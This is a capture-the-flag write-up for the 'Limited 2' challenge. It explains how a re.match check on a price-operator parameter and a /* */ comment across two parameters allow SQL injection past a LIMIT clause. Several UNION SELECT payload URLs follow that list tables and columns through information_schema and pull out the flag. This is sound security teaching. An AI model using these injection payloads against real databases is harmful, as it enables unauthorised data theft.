# Limited 2
Created by: SamXML  
Writeup by: Ethan Andrews (UofUsec) 

## Description
Can you read the flag in another table?

## Writeup
### Initial Analysis
We can see that it's a database website that has 3 query parameters.

![image](https://github.com/user-attachments/assets/0707126e-e157-45e3-b063-a245acdf2e0c)

By analyzing the code, we can see the actual query statement.

![image](https://github.com/user-attachments/assets/ca91fee6-5c0d-4321-8d76-2c41fe9b8961)

This makes it clear that a SQL injection is necessary.

### Code Analysis

We will analyze each of the parameters to see where the SQL injection could take place.

#### price parameter
![image](https://github.com/user-attachments/assets/1fb0f10f-e92d-426c-9372-8498d4110a53)

It is clear that the price parameter can only contain numerical values, which means this probably isn't the variable to focus on.

#### priceop parameter

![image](https://github.com/user-attachments/assets/2095e2ea-c694-4652-9fde-bd99b75aa9d2)

The priceop parameter claims that it only allows =, <, <=, <>, >=, or >. It checks for this by ensuring the length isn't greater
than 4, and by matching it with a regular expression. However, the way it matches it with the regular expression is by performing
re.match() instead of re.fullmatch(). 

The re.match() function doesn't perform an exact match, it just checks if the beginning of the string matches the
regular expression. So it really only checks to see if the first few characters matches one of =, <, ...etc. 
This means it will accept values such as '=abc' because it is not greater than 4, and the beginning matches
the regular expression.

#### limit parameter

![image](https://github.com/user-attachments/assets/1bc50cbe-a641-4ed1-bda5-077c18cb33d6)

The limit parameter is put into the query without any modification. The code comment above the statement explains that this is 
because you cannot perform SQL injections after a LIMIT clause.

This is further confirmed by the fact that it also filters out ';' to ensure that only one statement can be executed.

![image](https://github.com/user-attachments/assets/66bf93bc-abf4-4936-b2e5-3690dc4d8dc8)

So even though we can freely modify the limit parameter, we won't be able to perform SQL injection if the payload 
comes after the LIMIT clause.

#### Synopsis

In the priceop parameter, we get a max of 3 free characters (the operation followed by any 3 characters). And in the limit
variable we get as many characters as we want.

### Hidden Vulnerability

The hidden vulnerability to this statement is actually hinted at in the statement itself, particularly a flag location (NOTE: This is not the flag for this challenge. This is the flag for LIMITED 1).
This string contains a flag commented into the statement. 

![image](https://github.com/user-attachments/assets/d77496b6-a32f-445b-be38-f9d2294b98c0)


This shows that comments can be inserted via `/* */`. We also know that the LIMIT clause comes between priceop and limit. So
if priceop were to equal `/*` and limit were to equal `*/`, anything between it will be commented out. This means that if we want to get rid of the LIMIT clause, we can
simply comment it out.

Luckily, this works because we only need two free characters to insert the beginning of the comment `/*`, and the priceop
parameter gives us 3 free characters. So we can set the priceop parameter to be something like `=0/*` and the limit parameter
to be `*/` plus any SQL injection code we want.

```URL
https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1
```

![image](https://github.com/user-attachments/assets/4b0ef1a1-5f35-46e8-9239-bf33924a43bb)

This tells us there are more columns. We will continue to add 1's until it works:

```URL
https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, 1
```

![image](https://github.com/user-attachments/assets/a4cacfd3-c26c-4895-b49d-bf5c0085f821)

We now have a successful method for SQL injection.

### SQL Injection Payload

The challenge hint says that the flag is located in another table. We can print out the tables using `information_schema.tables`

```URL
https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, table_name FROM information_schema.tables
```

![image](https://github.com/user-attachments/assets/6cd6e981-a29b-4a46-82c5-c3f5638c25f3)

We see a table of interest labeled Flag_843423739.

We will look at the columns inside of flag using `information_schema.columns`


```URL
https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, column_name FROM information_schema.columns where table_name="Flag_843423739"
```

![image](https://github.com/user-attachments/assets/ea4138ab-42c5-450d-a377-261ce12d6c73)

We see one column labeled value. Now we can simply query the value column from the table.

```URL
https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, value FROM Flag_843423739
```

And this returns the flag.

## Important Concepts
- SQL Injection
- information_schema.tables
- information_schema.columns
